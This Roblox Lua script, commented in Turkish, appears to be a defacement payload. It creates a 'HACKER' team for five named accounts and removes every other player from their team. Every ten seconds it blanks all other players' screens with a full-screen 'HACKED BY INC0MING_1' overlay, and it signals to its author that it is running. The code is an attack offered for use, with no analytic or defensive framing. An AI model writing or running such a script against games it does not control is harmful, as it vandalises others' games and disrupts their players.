local teamName = "HACKER"
local teamColor = BrickColor.new("Really red")
local allowedPlayers = { "guastinnedemek15","mertcanlo153727", "INC0MING_1","gorrgul","goktugakturk10" }
local messageText = "HACKED BY INC0MING_1"
local delayTime = 10 -- saniye

local Teams = game:GetService("Teams")
local Players = game:GetService("Players")

-- Takım kontrolü ve oluşturma
local team = Teams:FindFirstChild(teamName)
if not team then
    team = Instance.new("Team")
    team.Name = teamName
    team.TeamColor = teamColor
    team.AutoAssignable = false
    team.Parent = Teams
    print("✅ HACKER takımı oluşturuldu.")
else
    print("ℹ️ HACKER takımı zaten var.")
end

-- Takım atamalarını yap
local function updateTeams()
    for _, player in ipairs(Players:GetPlayers()) do
        if table.find(allowedPlayers, player.Name) then
            player.Team = team
            player.TeamColor = teamColor
        else
            player.Team = nil
        end
    end
end

Players.PlayerAdded:Connect(function(player)
    updateTeams()
end)

updateTeams()

-- Çalışıyor onayı için kendine özel mesaj göster
local function showWorkingMessage()
    local player = Players:FindFirstChild("INC0MING_1")
    if player then
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "WorkingConfirm"
        screenGui.ResetOnSpawn = false
        screenGui.Parent = player:FindFirstChildOfClass("PlayerGui")
        
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(0.3,0,0.05,0)
        label.Position = UDim2.new(0.35,0,0,10)
        label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        label.BackgroundTransparency = 0.5
        label.TextColor3 = Color3.fromRGB(0, 255, 0)
        label.TextScaled = true
        label.Font = Enum.Font.SourceSansBold
        label.Text = "Mesaj sistemi aktif!"
        label.Parent = screenGui
        
        game:GetService("Debris"):AddItem(screenGui, 1)
    end
end

-- Mesaj gönderme döngüsü
task.spawn(function()
    print("✅ Mesaj sistemi başlatıldı.")
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if not table.find(allowedPlayers, player.Name) then
                local screenGui = Instance.new("ScreenGui")
                screenGui.ResetOnSpawn = false
                screenGui.Name = "HackMessage"
                screenGui.Parent = player:FindFirstChildOfClass("PlayerGui")
                
                local bg = Instance.new("Frame")
                bg.Size = UDim2.new(1, 0, 1, 0)
                bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                bg.BackgroundTransparency = 0
                bg.Parent = screenGui
                
                local textLabel = Instance.new("TextLabel")
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.BackgroundTransparency = 1
                textLabel.Text = messageText
                textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                textLabel.TextScaled = true
                textLabel.Font = Enum.Font.Arcade
                textLabel.Parent = bg
                
                game:GetService("Debris"):AddItem(screenGui, 3)
            end
        end
        -- Kendine küçük mesaj göster
        showWorkingMessage()
        task.wait(delayTime)
    end
end)
